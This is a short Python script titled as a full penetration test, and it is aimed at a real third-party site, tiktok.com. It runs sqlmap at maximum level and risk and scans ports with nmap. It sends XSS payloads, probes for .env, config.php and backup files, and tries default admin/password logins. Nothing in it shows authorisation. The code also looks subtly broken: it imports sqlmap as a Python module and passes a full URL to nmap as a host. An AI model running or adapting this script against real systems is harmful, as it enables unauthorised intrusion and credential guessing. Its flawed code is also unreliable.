# Full Penetration Testing Script

import requests
from bs4 import BeautifulSoup
import sqlmap
import nmap
import os

# Define target URL
target_url = "http://tiktok.com"

# Function to test for SQL Injection
def sql_injection_test(url):
    sqlmap_command = f"sqlmap -u {url} --batch --level=5 --risk=3"
    os.system(sqlmap_command)

# Function to scan for open ports
def port_scan(target):
    nm = nmap.PortScanner()
    nm.scan(target, '1-1024')
    return nm.all_hosts()

# Function to test for XSS vulnerabilities
def xss_test(url):
    payloads = ["<script>alert('XSS')</script>", "'><img src=x onerror=alert(1)>"]
    for payload in payloads:
        response = requests.get(url + "?search=" + payload)
        if payload in response.text:
            print(f"XSS vulnerability found with payload: {payload}")

# Function to check for sensitive files
def sensitive_file_check(url):
    sensitive_files = ["/.env", "/config.php", "/backup.zip"]
    for file in sensitive_files:
        response = requests.get(url + file)
        if response.status_code == 200:
            print(f"Sensitive file found: {url + file}")

# Function to check user authentication
def user_authentication_test(url):
    login_url = url + "/login"
    credentials = [("admin", "password"), ("user", "password")]
    for username, password in credentials:
        response = requests.post(login_url, data={"username": username, "password": password})
        if "Welcome" in response.text:
            print(f"Authenticated as {username}")

# Function to analyze logs
def log_analysis(log_file):
    with open(log_file, 'r') as file:
        logs = file.readlines()
        for log in logs:
            if "ERROR" in log:
                print(f"Error found in logs: {log}")

# Execute tests
if __name__ == "__main__":
    sql_injection_test(target_url)
    port_scan(target_url)
    xss_test(target_url)
    sensitive_file_check(target_url)
    user_authentication_test(target_url)
    log_analysis("server.log")
